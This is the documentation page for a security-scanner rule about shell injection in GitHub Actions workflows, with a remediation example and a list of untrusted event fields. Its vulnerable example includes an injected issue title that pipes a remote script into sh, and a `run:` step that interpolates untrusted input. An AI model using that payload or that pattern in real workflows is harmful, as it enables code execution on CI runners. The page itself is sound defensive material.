# code-injection-critical

A `${{ ... }}` expression that resolves attacker-controlled text (issue title, PR body, branch name, etc.) is interpolated directly into a `run:` block. GitHub Actions substitutes the value *before* the shell parses the command, so any shell metacharacter the attacker includes is executed as code.

The `-critical` variant fires when the surrounding trigger is privileged (`pull_request_target`, `issue_comment`, `workflow_run`, etc.) and the expression source is untrusted.

## Remediation

Bind the expression to an environment variable and reference the env var in the shell with proper quoting:

```yaml
# Before — vulnerable. Issue title `"; curl evil.sh | sh; #` becomes shell code.
- run: echo "Hello ${{ github.event.issue.title }}"

# After — the value never reaches shell parsing as code, only as a quoted string.
- run: echo "Hello $TITLE"
  env:
    TITLE: ${{ github.event.issue.title }}
```

Quote the variable reference in shell (`"$TITLE"`, not `$TITLE`) so a value containing spaces or globs cannot expand into additional arguments.

## Common offenders

- `github.event.issue.title`, `github.event.issue.body`
- `github.event.pull_request.title`, `github.event.pull_request.body`, `github.event.pull_request.head.ref`
- `github.event.comment.body`
- `github.head_ref` (PR branch name)
- `github.event.workflow_run.head_branch`

Treat anything under `github.event.*` originating from a fork or a user-submitted field as untrusted.
